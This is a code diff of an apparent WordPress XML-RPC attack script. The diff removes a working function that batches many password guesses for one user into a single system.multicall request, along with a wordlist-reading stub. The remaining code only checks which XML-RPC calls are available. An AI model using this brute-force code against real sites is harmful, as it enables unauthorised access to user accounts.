@@ -34,29 +34,6 @@ def check_for_calls(url, xml_options):
         # In case of an issue we'd get this error
         sys.exit("Missing calls for brute force attack, can't go on :(")
 
-# Send this payload numerous times using the system.multicall to bruteforce the passwords for a given user
-def brute_xmlrpc_payload(target_url, user, passwords):
-    payload_prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
-    payload_body = ""
-    payload_suffix = "</data></array></value></param></params></methodCall>"
-
-    for password in passwords:
-        payload_body += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
-        payload_body += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
-        payload_body += "</data></array></value></data></array></value></member></struct></value>"
-
-    data = payload_prefix + payload_body + payload_suffix
-    headers = {"Content-Type": "application/xml"}
-    req = requests.post(target_url, data=data, headers=headers)
-    req.encoding = 'UTF-8'
-    return req.text
-
-def bruteforce(wordlist):
-    with open(wordlist) as f:
-        lines = f.readlines()
-        print(lines)
-
-
 # Only verify available calls in XMLRPC
 def main():
     # IP address is available as a command line argument
